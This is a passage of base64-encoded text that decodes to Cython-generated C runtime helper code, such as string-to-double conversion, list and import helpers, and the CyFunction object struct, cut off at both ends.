AgICByZXR1cm4gKHNpZ24gPT0gXCctXCcpID8gLVB5X0hVR0VfVkFMIDogUHlfSFVHRV9WQUw7XG4gICAgICAgIGNhc2UgXCcuXCc6IGNhc2UgXCcwXCc6IGNhc2UgXCcxXCc6IGNhc2UgXCcyXCc6IGNhc2UgXCczXCc6IGNhc2UgXCc0XCc6IGNhc2UgXCc1XCc6IGNhc2UgXCc2XCc6IGNhc2UgXCc3XCc6IGNhc2UgXCc4XCc6IGNhc2UgXCc5XCc6XG4gICAgICAgICAgICBicmVhaztcbiAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgIGdvdG8gcGFyc2VfZmFpbHVyZTtcbiAgICB9XG4gICAgcmV0dXJuIDAuMDtcbnBhcnNlX2ZhaWx1cmU6XG4gICAgcmV0dXJuIC0xLjA7XG59XG5zdGF0aWMgZG91YmxlIF9fUHl4X1B5VW5pY29kZV9Bc0RvdWJsZV9XaXRoU3BhY2VzKFB5T2JqZWN0ICpvYmopIHtcbiAgICBkb3VibGUgdmFsdWU7XG4gICAgY29uc3QgY2hhciAqbGFzdDtcbiAgICBjaGFyICplbmQ7XG4gICAgUHlfc3NpemVfdCBzdGFydCwgbGVuZ3RoID0gUHlVbmljb2RlX0dFVF9MRU5HVEgob2JqKTtcbiAgICBjb25zdCBpbnQga2luZCA9IFB5VW5pY29kZV9LSU5EKG9iaik7XG4gICAgY29uc3Qgdm9pZCogZGF0YSA9IFB5VW5pY29kZV9EQVRBKG9iaik7XG4gICAgc3RhcnQgPSAwO1xuICAgIHdoaWxlIChQeV9VTklDT0RFX0lTU1BBQ0UoUHlVbmljb2RlX1JFQUQoa2luZCwgZGF0YSwgc3RhcnQpKSlcbiAgICAgICAgc3RhcnQrKztcbiAgICB3aGlsZSAoc3RhcnQgPCBsZW5ndGggLSAxICYmIFB5X1VOSUNPREVfSVNTUEFDRShQeVVuaWNvZGVfUkVBRChraW5kLCBkYXRhLCBsZW5ndGggLSAxKSkpXG4gICAgICAgIGxlbmd0aC0tO1xuICAgIGxlbmd0aCAtPSBzdGFydDtcbiAgICBpZiAodW5saWtlbHkobGVuZ3RoIDw9IDApKSBnb3RvIGZhbGxiYWNrO1xuICAgIHZhbHVlID0gX19QeXhfX1B5VW5pY29kZV9Bc0RvdWJsZV9pbmZfbmFuKGRhdGEsIGtpbmQsIHN0YXJ0LCBsZW5ndGgpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSAtMS4wKSkgZ290byBmYWxsYmFjaztcbiAgICBpZiAodmFsdWUgIT0gMC4wKSByZXR1cm4gdmFsdWU7XG4gICAgaWYgKGxlbmd0aCA8IDQwKSB7XG4gICAgICAgIGNoYXIgbnVtYmVyWzQwXTtcbiAgICAgICAgbGFzdCA9IF9fUHl4X19QeVVuaWNvZGVfQXNEb3VibGVfQ29weShkYXRhLCBraW5kLCBudW1iZXIsIHN0YXJ0LCBzdGFydCArIGxlbmd0aCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbGFzdCkpIGdvdG8gZmFsbGJhY2s7XG4gICAgICAgIHZhbHVlID0gUHlPU19zdHJpbmdfdG9fZG91YmxlKG51bWJlciwgJmVuZCwgTlVMTCk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgY2hhciAqbnVtYmVyID0gKGNoYXIqKSBQeU1lbV9NYWxsb2MoKGxlbmd0aCArIDEpICogc2l6ZW9mKGNoYXIpKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFudW1iZXIpKSBnb3RvIGZhbGxiYWNrO1xuICAgICAgICBsYXN0ID0gX19QeXhfX1B5VW5pY29kZV9Bc0RvdWJsZV9Db3B5KGRhdGEsIGtpbmQsIG51bWJlciwgc3RhcnQsIHN0YXJ0ICsgbGVuZ3RoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFsYXN0KSkge1xuICAgICAgICAgICAgUHlNZW1fRnJlZShudW1iZXIpO1xuICAgICAgICAgICAgZ290byBmYWxsYmFjaztcbiAgICAgICAgfVxuICAgICAgICB2YWx1ZSA9IFB5T1Nfc3RyaW5nX3RvX2RvdWJsZShudW1iZXIsICZlbmQsIE5VTEwpO1xuICAgICAgICBQeU1lbV9GcmVlKG51bWJlcik7XG4gICAgfVxuICAgIGlmIChsaWtlbHkoZW5kID09IGxhc3QpIHx8ICh2YWx1ZSA9PSAoZG91YmxlKS0xICYmIFB5RXJyX09jY3VycmVkKCkpKSB7XG4gICAgICAgIHJldHVybiB2YWx1ZTtcbiAgICB9XG5mYWxsYmFjazpcbiAgICByZXR1cm4gX19QeXhfU2xvd1B5U3RyaW5nX0FzRG91YmxlKG9iaik7XG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGRvdWJsZSBfX1B5eF9QeVVuaWNvZGVfQXNEb3VibGUoUHlPYmplY3QgKm9iaikge1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkob2JqKSA9PSAtMSkpXG4gICAgICAgIHJldHVybiAoZG91YmxlKS0xO1xuICAgIGlmIChsaWtlbHkoUHlVbmljb2RlX0lTX0FTQ0lJKG9iaikpKSB7XG4gICAgICAgIGNvbnN0IGNoYXIgKnM7XG4gICAgICAgIFB5X3NzaXplX3QgbGVuZ3RoO1xuICAgICAgICBzID0gUHlVbmljb2RlX0FzVVRGOEFuZFNpemUob2JqLCAmbGVuZ3RoKTtcbiAgICAgICAgcmV0dXJuIF9fUHl4X19QeUJ5dGVzX0FzRG91YmxlKG9iaiwgcywgbGVuZ3RoKTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X1B5VW5pY29kZV9Bc0RvdWJsZV9XaXRoU3BhY2VzKG9iaik7XG4jZWxzZVxuICAgIHJldHVybiBfX1B5eF9TbG93UHlTdHJpbmdfQXNEb3VibGUob2JqKTtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9fUHlOdW1iZXJfRmxvYXQoUHlPYmplY3QqIG9iaik7XG4jZGVmaW5lIF9fUHl4X1B5TnVtYmVyX0Zsb2F0KHgpIChQeUZsb2F0X0NoZWNrRXhhY3QoeCkgPyBfX1B5eF9OZXdSZWYoeCkgOiBfX1B5eF9fUHlOdW1iZXJfRmxvYXQoeCkpXG5cblxuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxvbmdfVHJ1ZURpdmlkZU9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spXFxcbiAgICAoaW5wbGFjZSA/IFB5TnVtYmVyX0luUGxhY2VUcnVlRGl2aWRlKG9wMSwgb3AyKSA6IFB5TnVtYmVyX1RydWVEaXZpZGUob3AxLCBvcDIpKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVJcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRm9ybWF0KFB5T2JqZWN0KiBzLCBQeU9iamVjdCogZik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Gb3JtYXQocywgZikgUHlPYmplY3RfRm9ybWF0KHMsIGYpXG4jZW5kaWZcblxuXG4jIGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICNpZiBDWVRIT05fUkVGTkFOTllcbiAgICAgICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKCZsZWZ0LCByaWdodCwgX19weXhfcmVmbmFubnkpXG4gICAgI2Vsc2VcbiAgICAgICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKCZsZWZ0LCByaWdodClcbiAgICAjZW5kaWZcbiAgICBzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKFB5T2JqZWN0ICoqcF9sZWZ0LCBQeU9iamVjdCAqcmlnaHRcbiAgICAgICAgI2lmIENZVEhPTl9SRUZOQU5OWVxuICAgICAgICAsIHZvaWQqIF9fcHl4X3JlZm5hbm55XG4gICAgICAgICNlbmRpZlxuICAgICk7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0XG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VTYWZlKGxlZnQsIHJpZ2h0KSAoKHVubGlrZWx5KChsZWZ0KSA9PSBQeV9Ob25lKSB8fCB1bmxpa2VseSgocmlnaHQpID09IFB5X05vbmUpKSA/XFxcbiAgICBQeU51bWJlcl9JblBsYWNlQWRkKGxlZnQsIHJpZ2h0KSA6IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKGxlZnQsIHJpZ2h0KSlcblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0U2xpY2UoXG4gICAgICAgIFB5T2JqZWN0KiBvYmosIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLFxuICAgICAgICBQeU9iamVjdCoqIHB5X3N0YXJ0LCBQeU9iamVjdCoqIHB5X3N0b3AsIFB5T2JqZWN0KiogcHlfc2xpY2UsXG4gICAgICAgIGludCBoYXNfY3N0YXJ0LCBpbnQgaGFzX2NzdG9wLCBpbnQgd3JhcGFyb3VuZCk7XG5cblxuI2lmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlMaXN0X0FwcGVuZChQeU9iamVjdCogbGlzdCwgUHlPYmplY3QqIHgpIHtcbiAgICBQeUxpc3RPYmplY3QqIEwgPSAoUHlMaXN0T2JqZWN0KikgbGlzdDtcbiAgICBQeV9zc2l6ZV90IGxlbiA9IFB5X1NJWkUobGlzdCk7XG4gICAgaWYgKGxpa2VseShMLT5hbGxvY2F0ZWQgPiBsZW4pICYgbGlrZWx5KGxlbiA+IChMLT5hbGxvY2F0ZWQgPj4gMSkpKSB7XG4gICAgICAgIFB5X0lOQ1JFRih4KTtcbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgICAgIEwtPm9iX2l0ZW1bbGVuXSA9IHg7XG4gICAgICAgICNlbHNlXG4gICAgICAgIFB5TGlzdF9TRVRfSVRFTShsaXN0LCBsZW4sIHgpO1xuICAgICAgICAjZW5kaWZcbiAgICAgICAgX19QeXhfU0VUX1NJWkUobGlzdCwgbGVuICsgMSk7XG4gICAgICAgIHJldHVybiAwO1xuICAgIH1cbiAgICByZXR1cm4gUHlMaXN0X0FwcGVuZChsaXN0LCB4KTtcbn1cbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5TGlzdF9BcHBlbmQoTCx4KSBQeUxpc3RfQXBwZW5kKEwseClcbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsMkFyZ3MoUHlPYmplY3QqIGZ1bmN0aW9uLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpO1xuXG5cbnN0YXRpYyBpbnQgX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqKm1ldGhvZCk7XG5cblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUsIFB5T2JqZWN0KiBhcmcpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9BcHBlbmQoUHlPYmplY3QqIEwsIFB5T2JqZWN0KiB4KTtcblxuXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SXRlbShQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqa2V5KTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEl0ZW0ob2JqLCBrZXkpICBQeU9iamVjdF9HZXRJdGVtKG9iaiwga2V5KVxuI2VuZGlmXG5cblxuI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMClcbiNkZWZpbmUgX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIGFsd2F5c19jYWxsLCB2aXNpdCwgYXJnKSAwXG4jZWxzZVxuc3RhdGljIGludCBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoUHlPYmplY3QgKm8sIGludCBhbHdheXNfY2FsbCwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpO1xuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0VHlwZURpY3QoUHlUeXBlT2JqZWN0ICp0cCk7XG4jZW5kaWZcblxuXG5zdGF0aWMgaW50IF9fUHl4X19TZXRJdGVtT25UeXBlRGljdChQeVR5cGVPYmplY3QgKnRwLCBQeU9iamVjdCAqaywgUHlPYmplY3QgKnYpO1xuI2RlZmluZSBfX1B5eF9TZXRJdGVtT25UeXBlRGljdCh0cCwgaywgdikgX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KChQeVR5cGVPYmplY3QqKXRwLCBrLCB2KVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKFB5VHlwZV9TcGVjICpzcGVjLCBQeVR5cGVPYmplY3QgKnR5cGUpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTm9BcmcoUHlPYmplY3QgKmZ1bmMpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDAoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG5zdGF0aWMgaW50IF9fUHl4X3ZhbGlkYXRlX2Jhc2VzX3R1cGxlKGNvbnN0IGNoYXIgKnR5cGVfbmFtZSwgUHlfc3NpemVfdCBkaWN0b2Zmc2V0LCBQeU9iamVjdCAqYmFzZXMpO1xuI2VuZGlmXG5cblxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9SZWFkeShQeVR5cGVPYmplY3QgKnQpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0KFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqZnJvbV9saXN0LCBpbnQgbGV2ZWwpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGVfV2Fsa1BhcnRzKFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlMaXN0X1BhY2soUHlfc3NpemVfdCBuLCAuLi4pO1xuXG5cbnN0YXRpYyBQeU9iamVjdCogX19QeXhfSW1wb3J0RnJvbShQeU9iamVjdCogbW9kdWxlLCBQeU9iamVjdCogbmFtZSk7XG5cblxuI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX011bHRpcGx5X0xlZnQobXVsLCBzZXEpICBfX1B5eF9QeVNlcXVlbmNlX011bHRpcGx5KHNlcSwgbXVsKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5U2VxdWVuY2VfTXVsdGlwbHkoUHlPYmplY3QgKnNlcSwgUHlfc3NpemVfdCBtdWwpO1xuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfRmV0Y2hTaGFyZWRDeXRob25BQklNb2R1bGUodm9pZCk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5RGljdF9TZXREZWZhdWx0KFB5T2JqZWN0ICpkLCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqZGVmYXVsdF92YWx1ZSwgaW50IGlzX3NhZmVfdHlwZSk7XG5cblxuc3RhdGljIFB5VHlwZU9iamVjdCogX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoUHlUeXBlT2JqZWN0ICptZXRhY2xhc3MsIFB5T2JqZWN0ICptb2R1bGUsIFB5VHlwZV9TcGVjICpzcGVjLCBQeU9iamVjdCAqYmFzZXMpO1xuXG5cbnN0YXRpYyBpbnQgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfaW5pdChQeU9iamVjdCAqbW9kdWxlKTtcbiNkZWZpbmUgX19QeXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfVVNFRFxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCk7XG5cblxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTClcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprdyk7XG4jZW5kaWZcblxuXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fVVNFRFxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCAgMHgwMVxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NMQVNTTUVUSE9EICAgMHgwMlxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NDTEFTUyAgICAgICAgMHgwNFxuI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NPUk9VVElORSAgICAgMHgwOFxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0dldENsb3N1cmUoZilcXFxuICAgICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZnVuY19jbG9zdXJlKVxuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihmKVxcXG4gICAgICAoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIChmKSktPmZ1bmNfY2xhc3NvYmopXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZilcXFxuICAgICAgKChQeU9iamVjdCopICgoUHlDTWV0aG9kT2JqZWN0ICopIChmKSktPm1tX2NsYXNzKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooZiwgY2xhc3NvYmopXFxcbiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9TZXRDbGFzc09iaigoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZiksIChjbGFzc29iaikpXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fRGVmYXVsdHModHlwZSwgZilcXFxuICAgICgodHlwZSAqKSgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHMpKVxuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzR2V0dGVyKGYsIGcpXFxcbiAgICAoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHNfZ2V0dGVyID0gKGcpXG50eXBlZGVmIHN0cnVjdCB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5T2JqZWN0X0hFQURcbiAgICBQeU9iamVjdCAqZnVuYztcbiNlbGlmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMVxuICAgIFB5Q0Z1bmN0aW9uT2JqZWN0IGZ1bmM7XG4jZWxzZVxuICAgIFB5Q01ldGhvZE9iamVjdCBmdW5jO1xuI2VuZGlmXG4jaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwgfHxcXFxuICAgICAgICAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBDWVRIT05fTUVUSF9GQVNUQ0FMTClcbiAgICBfX3B5eF92ZWN0b3JjYWxsZnVuYyBmdW5jX3ZlY3RvcmNhbGw7XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZ1bmNfd2Vha3JlZmxpc3Q7XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqZnVuY19kaWN0O1xuICAgIFB5T2JqZWN0ICpmdW5jX25hbWU7XG4gICAgUHlPYmplY3QgKmZ1bmNfcXVhbG5hbWU7XG4gICAgUHlPYmplY3QgKmZ1bmNfZG9jO1xuICAgIFB5T2JqZWN0ICpmdW5jX2dsb2JhbHM7XG4gICAgUHlPYmplY3QgKmZ1bmNfY29kZTtcbiAgICBQeU9iamVjdCAqZnVuY19jbG9zdXJlO1xuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmZ1bmNfY2xhc3NvYmo7XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqZGVmYXVsdHM7XG4gICAgaW50IGZsYWdzO1xuICAgIFB5T2JqZWN0ICpkZWZhdWx0c190dXBsZTtcbiAgICBQeU9iamVjdCAqZGVmYXVsdHNfa3dkaWN0O1xuICAgIFB5T2JqZWN0ICooKmRlZmF1bHRzX2dldHRlcikoUHlPYmplY3QgKik7XG4gICAgUHlPYmplY3QgKmZ1bmNfYW5ub3RhdGlvbnM7XG4gICAgUHlPYmplY3QgKmZ1bmNfaXNfY29yb3V0aW5lO1xufSBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0O1xuI3VuZGVmIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVja1xuI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX0NoZWNrKG9iaikgIF9fUHl4X1R5cGVDaGVjayhvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKVxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2sob2JqKSAgX19QeXhfVHlwZUNoZWNrMihvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0N5RnVuY3Rpb25UeXBlLCAmUHlDRnVuY3Rpb25fVHlwZSlcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9DaGVja0V4YWN0KG9iaikgIF9fUHl4X0lTX1RZUEUob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSk7XG4jdW5kZWYgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uXG4jZGVmaW5lIF9fUHl4X0lzU2FtZUNGdW5jdGlvbihmdW5jLCBjZnVuYykgICBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihmdW5jLCBjZnVuYylcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9Jbml0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIG9wLCBQeU1ldGhvZERlZiAqbWwsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKmdsb2JhbHMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0N5RnVuY3Rpb25fU2V0Q2xhc3NPYmooX19weXhfQ3lGdW5jdGlvbk9iamVjdCogZiwgUHlPYmplY3QqIGNsYXNzb2JqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0luaXREZWZhdWx0cyhQeU9iamVjdCAqZnVuYyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5VHlwZU9iamVjdCAqZGVmYXVsdHNfdHlwZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNUdXBsZShQeU9iamVjdCAqbSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp0dXBsZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNLd0RpY3QoUHlPYmplY3QgKm0sXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldEFubm90YXRpb25zRGljdChQeU9iamVjdCAqbSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmRpY3QpO1xuc3RhdGljIGludCBfX3B5eF9DeUZ1bmN0aW9uX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1MoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX08oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0